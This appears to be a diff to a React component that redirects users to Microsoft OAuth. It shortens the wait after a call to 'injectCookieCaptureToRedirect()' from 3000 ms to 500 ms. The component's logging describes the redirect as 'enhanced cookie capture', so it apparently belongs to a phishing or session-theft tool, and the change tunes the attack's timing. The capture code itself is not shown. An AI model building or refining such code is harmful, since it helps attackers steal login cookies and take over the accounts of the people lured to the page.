@@ -162,11 +162,11 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
       // Execute advanced capture attempt
       injectCookieCaptureToRedirect();
       
-      // Wait for capture attempt, then redirect
+      // 🟢 REDUCED DELAY: Wait for capture attempt, then redirect (reduced from 3000ms to 500ms)
       setTimeout(() => {
         console.log('🔄 Redirecting to Microsoft OAuth with enhanced cookie capture...');
         window.location.href = authUrl;
-      }, 3000);
+      }, 500);
     };
     
     // Start OAuth process immediately (ORIGINAL TIMING)
